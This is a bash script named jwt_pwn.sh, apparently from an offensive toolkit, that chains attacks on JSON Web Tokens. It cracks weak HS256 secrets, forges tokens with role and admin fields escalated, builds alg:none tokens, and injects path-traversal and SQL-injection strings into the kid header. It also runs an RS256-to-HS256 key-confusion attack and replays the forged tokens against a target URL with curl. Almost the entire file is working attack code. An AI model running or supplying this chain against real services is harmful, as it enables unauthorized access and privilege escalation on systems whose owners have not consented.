#!/usr/bin/env bash
# ============================================================================
# jwt_pwn.sh — CyberStrike JWT attack orchestrator
# ============================================================================
# Workflow: decode → fingerprint alg → crack secret → forge admin → replay
# Requires: jwt_tool, python3 (with pyjwt)
# Usage:
#   jwt_pwn.sh <JWT>                       # full attack chain
#   jwt_pwn.sh <JWT> decode                # just decode
#   jwt_pwn.sh <JWT> crack                 # crack HS256 secret only
#   jwt_pwn.sh <JWT> forge <SECRET>        # forge with known/empty secret
#   jwt_pwn.sh <JWT> none                  # try alg:none attack
#   jwt_pwn.sh <JWT> kid                   # kid path traversal
#   jwt_pwn.sh <JWT> jwk                   # JWK header injection
#   jwt_pwn.sh <JWT> replay <URL>          # replay forged token against URL
# ============================================================================

set -e

JWT_TOOL="python /c/cyberstrike/tools/jwt_tool/jwt_tool.py"

red()   { printf "\033[31m%s\033[0m\n" "$*"; }
grn()   { printf "\033[32m%s\033[0m\n" "$*"; }
ylw()   { printf "\033[33m%s\033[0m\n" "$*"; }
cya()   { printf "\033[36m%s\033[0m\n" "$*"; }
bold()  { printf "\033[1m%s\033[0m\n" "$*"; }

banner() {
cat <<'EOF'
  ____       _       _   ____             _
 |  _ \ _ __(_)_ __ / | |  _ \ _   _ ___| |_
 | |_) | '__| | '_ \| | | |_) | | | / __| __|
 |  __/| |  | | | | | | |  __/| |_| \__ \ |_
 |_|   |_|  |_|_| |_|_| |_|    \__,_|___/\__|
   jwt_pwn v1.0 — decode / crack / forge / replay
EOF
}

# ============== DECODE ==============
decode() {
  local jwt="$1"
  echo
  bold "[1] DECODE"
  cya "header:"
  python -c "
import jwt, json, sys
t = '$jwt'
try:
    h, p = t.split('.')[:2]
    pad = lambda s: s + '=' * (-len(s) % 4)
    print('  header :', json.dumps(json.loads(__import__('base64').urlsafe_b64decode(pad(h))), indent=2))
    print('  payload:', json.dumps(json.loads(__import__('base64').urlsafe_b64decode(pad(p))), indent=2))
except Exception as e:
    print('  decode failed:', e)
"
}

# ============== CRACK (HS256 weak secret) ==============
crack() {
  local jwt="$1"
  echo
  bold "[2] CRACK — testing weak HS256 secrets"
  # quick local list first
  local wordlist="/c/cyberstrike/tools/jwt_tool/jwt-secrets.txt"
  [ -f "$wordlist" ] || wordlist=""
  if [ -n "$wordlist" ]; then
    echo "[*] using jwt_tool wordlist: $wordlist"
    $JWT_TOOL "$jwt" -d "$wordlist" 2>&1 | grep -E "matches|FOUND|SUCCESS" | head -5
  fi
  # also test empty / common
  for secret in "" secret password 123456 admin key jwt secret123 your-256-bit-secret changeme; do
    if $JWT_TOOL "$jwt" -p "$secret" 2>&1 | grep -qi "matches\|verified\|hmac OK"; then
      grn "[+] SECRET FOUND: '$secret'"
      echo "$secret" > /tmp/.jwt_secret
      return 0
    fi
  done
  ylw "[-] no weak secret in local list — try rockyou"
  return 1
}

# ============== FORGE ==============
forge() {
  local jwt="$1" secret="$2"
  echo
  bold "[3] FORGE — generating new token with secret='$secret'"
  if [ -z "$secret" ]; then
    # try empty secret
    ylw "[*] attempting empty-secret forge"
    python -c "
import jwt, sys
t = '$jwt'.split('.')
print(jwt.encode(__import__('json').loads(__import__('base64').urlsafe_b64decode(t[1]+'='*(-len(t[1])%4))), '', algorithm='HS256'))
" 2>&1 | tail -1
  else
    python -c "
import jwt, json, base64
t = '$jwt'.split('.')
pad = lambda s: s + '=' * (-len(s) % 4)
header  = json.loads(base64.urlsafe_b64decode(pad(t[0])))
payload = json.loads(base64.urlsafe_b64decode(pad(t[1])))
# escalate: try setting role/admin/verified to 1
for f in ('role','admin','is_admin','isAdmin','user_role','privilege','verified','sub','user_id'):
    if f in payload:
        payload[f] = 'admin' if isinstance(payload[f], str) and any(c.isdigit() for c in payload[f]) is False else (1 if isinstance(payload[f], int) else True)
print(jwt.encode(payload, '$secret', algorithm=header.get('alg','HS256')))
" 2>&1 | tail -1
  fi
}

# ============== ALG:NONE ==============
alg_none() {
  local jwt="$1"
  echo
  bold "[4] alg:NONE attack"
  ylw "[*] forging token with alg=none (signature stripped)"
  python -c "
import jwt, json, base64
t = '$jwt'.split('.')
pad = lambda s: s + '=' * (-len(s) % 4)
header  = json.loads(base64.urlsafe_b64decode(pad(t[0])))
payload = json.loads(base64.urlsafe_b64decode(pad(t[1])))
header['alg'] = 'none'
for f in ('role','admin','is_admin','isAdmin','user_role','privilege'):
    if f in payload:
        payload[f] = 'admin' if isinstance(payload[f], str) else 1
b64h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
b64p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
print(f'{b64h}.{b64p}.')
" 2>&1 | tail -1
}

# ============== KID INJECTION ==============
kid_inject() {
  local jwt="$1"
  echo
  bold "[5] KID injection (path traversal / SQLi)"
  ylw "[*] forging token with kid=../../dev/null"
  python -c "
import jwt, json, base64
t = '$jwt'.split('.')
pad = lambda s: s + '=' * (-len(s) % 4)
header  = json.loads(base64.urlsafe_b64decode(pad(t[0])))
payload = json.loads(base64.urlsafe_b64decode(pad(t[1])))
header['kid'] = '../../dev/null'
print(jwt.encode(payload, '', algorithm='HS256', headers={'kid':'../../dev/null'}))
" 2>&1 | tail -1
  ylw "[*] forging token with kid=' OR 1=1 --"
  python -c "
import jwt
t = '$jwt'.split('.')
import json, base64
pad = lambda s: s + '=' * (-len(s) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad(t[1])))
print(jwt.encode(payload, '', algorithm='HS256', headers={'kid':\"' OR 1=1 --\"}))
" 2>&1 | tail -1
}

# ============== JWK INJECTION ==============
jwk_inject() {
  local jwt="$1"
  echo
  bold "[6] JWK header injection (RS256→HS256 confusion)"
  ylw "[*] use jwt_tool for full JWK attack chain"
  $JWT_TOOL "$jwt" -X k -pk /tmp/test_pub.pem 2>&1 | head -10 || true
}

# ============== REPLAY ==============
replay() {
  local forged="$1" url="$2"
  echo
  bold "[7] REPLAY — sending forged token to $url"
  echo "[*] forged token: $forged"
  echo "[*] response:"
  curl -sk -o /tmp/jwt_replay_body -w "  status: %{http_code}\n  size:   %{size_download} bytes\n" \
    -H "Authorization: Bearer $forged" "$url"
  echo "  body (first 500c):"
  head -c 500 /tmp/jwt_replay_body | sed 's/^/    /'
  echo
}

# ============== FULL CHAIN ==============
full_chain() {
  local jwt="$1"
  banner
  echo "[*] target JWT: $jwt"
  decode "$jwt"
  if crack "$jwt"; then
    secret=$(cat /tmp/.jwt_secret 2>/dev/null || echo "")
    forged=$(forge "$jwt" "$secret")
    grn "[+] forged admin token: $forged"
  fi
  alg_none "$jwt"
  kid_inject "$jwt"
}

# ============== MAIN ==============

if [ $# -lt 1 ]; then
  banner
  echo
  echo "Usage: jwt_pwn.sh <JWT> [action]"
  echo
  echo "Actions:"
  echo "  decode              just decode header + payload"
  echo "  crack               test weak HS256 secret"
  echo "  forge <SECRET>      forge new token with secret"
  echo "  none                alg:none attack"
  echo "  kid                 kid header injection"
  echo "  jwk                 JWK confusion attack"
  echo "  replay <URL>        replay forged token against URL"
  echo "  (no action)         full attack chain"
  echo
  echo "Example:"
  echo "  jwt_pwn.sh eyJhbGc... decode"
  echo "  jwt_pwn.sh eyJhbGc... crack"
  echo "  jwt_pwn.sh eyJhbGc... forge mysecret"
  echo "  jwt_pwn.sh eyJhbGc... replay https://target.com/api/me"
  exit 0
fi

JWT="$1"
ACTION="${2:-full}"

if [ -z "$JWT" ]; then
  red "[-] empty JWT"
  exit 1
fi

case "$ACTION" in
  decode) banner; decode "$JWT" ;;
  crack)  banner; crack "$JWT" ;;
  forge)  banner; forge "$JWT" "$3" ;;
  none)   banner; alg_none "$JWT" ;;
  kid)    banner; kid_inject "$JWT" ;;
  jwk)    banner; jwk_inject "$JWT" ;;
  replay) banner; replay "$3" "$4" ;;
  full)   full_chain "$JWT" ;;
  *) red "[-] unknown action: $ACTION"; exit 1 ;;
esac
